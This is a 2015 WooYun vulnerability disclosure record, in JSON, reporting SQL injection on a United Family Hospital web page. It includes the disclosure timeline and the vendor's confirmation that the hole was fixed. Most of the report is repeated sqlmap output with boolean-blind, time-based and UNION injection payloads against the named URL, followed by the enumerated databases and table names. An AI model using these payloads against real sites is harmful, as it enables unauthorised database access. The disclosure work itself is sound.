{"id": 79010, "wybug_id": "wooyun-2015-0159072", "wybug_title": "和睦家医院某站sql注入", "wybug_corp": "ufh.com.cn", "wybug_author": "kernux", "wybug_date": "2015-12-07 17:18", "wybug_open_date": "2015-12-21 08:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-21：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： rt 详细说明：  从这开始：http://life.ufh.com.cn/guidelist.php?g_id=11g_id参数存在sql注入sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:---Parameter: g_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: g_id=11 AND 7545=7545    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: g_id=11 AND (SELECT * FROM (SELECT(SLEEP(5)))VGku)    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: g_id=-9239 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178766b71,0x4d4b767a645354417a72,0x7178787171),NULL,NULL,NULL,NULL,NULL,NULL-- ---back-end DBMS: MySQL 5.0.12available databases [2]:[*] information_schema[*] life_wpsqlmap resumed the following injection point(s) from stored session:---Parameter: g_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: g_id=11 AND 7545=7545    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: g_id=11 AND (SELECT * FROM (SELECT(SLEEP(5)))VGku)    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: g_id=-9239 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178766b71,0x4d4b767a645354417a72,0x7178787171),NULL,NULL,NULL,NULL,NULL,NULL-- ---back-end DBMS: MySQL 5.0.12available databases [2]:[*] information_schema[*] life_wpsqlmap resumed the following injection point(s) from stored session:---Parameter: g_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: g_id=11 AND 7545=7545    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: g_id=11 AND (SELECT * FROM (SELECT(SLEEP(5)))VGku)    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: g_id=-9239 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178766b71,0x4d4b767a645354417a72,0x7178787171),NULL,NULL,NULL,NULL,NULL,NULL-- ---back-end DBMS: MySQL 5.0.12Database: life_wp[28 tables]+-----------------------+| wp_activity           || wp_apphos             || wp_apply              || wp_channel            || wp_commentmeta        || wp_comments           || wp_forgetpwd          || wp_guide              || wp_home               || wp_hospital           || wp_links              || wp_member             || wp_options            || wp_order              || wp_pack               || wp_pactivity          || wp_personnel          || wp_postmeta           || wp_posts              || wp_prize              || wp_sign               || wp_term_relationships || wp_term_taxonomy      || wp_terms              || wp_usermeta           || wp_users              || wp_wechat             || wp_winning            |   漏洞证明：  从这开始：http://life.ufh.com.cn/guidelist.php?g_id=11g_id参数存在sql注入sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:---Parameter: g_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: g_id=11 AND 7545=7545    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: g_id=11 AND (SELECT * FROM (SELECT(SLEEP(5)))VGku)    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: g_id=-9239 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178766b71,0x4d4b767a645354417a72,0x7178787171),NULL,NULL,NULL,NULL,NULL,NULL-- ---back-end DBMS: MySQL 5.0.12available databases [2]:[*] information_schema[*] life_wpsqlmap resumed the following injection point(s) from stored session:---Parameter: g_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: g_id=11 AND 7545=7545    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: g_id=11 AND (SELECT * FROM (SELECT(SLEEP(5)))VGku)    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: g_id=-9239 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178766b71,0x4d4b767a645354417a72,0x7178787171),NULL,NULL,NULL,NULL,NULL,NULL-- ---back-end DBMS: MySQL 5.0.12available databases [2]:[*] information_schema[*] life_wpsqlmap resumed the following injection point(s) from stored session:---Parameter: g_id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: g_id=11 AND 7545=7545    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: g_id=11 AND (SELECT * FROM (SELECT(SLEEP(5)))VGku)    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: g_id=-9239 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178766b71,0x4d4b767a645354417a72,0x7178787171),NULL,NULL,NULL,NULL,NULL,NULL-- ---back-end DBMS: MySQL 5.0.12Database: life_wp[28 tables]+-----------------------+| wp_activity           || wp_apphos             || wp_apply              || wp_channel            || wp_commentmeta        || wp_comments           || wp_forgetpwd          || wp_guide              || wp_home               || wp_hospital           || wp_links              || wp_member             || wp_options            || wp_order              || wp_pack               || wp_pactivity          || wp_personnel          || wp_postmeta           || wp_posts              || wp_prize              || wp_sign               || wp_term_relationships || wp_term_taxonomy      || wp_terms              || wp_usermeta           || wp_users              || wp_wechat             || wp_winning            |   修复方案：  过滤   版权声明：转载请注明来源 kernux@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-08 08:32 厂商回复： 医院官方主页，篡改后会对影响医院声誉 最新状态： 2015-12-21：供应商已修复此漏洞  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}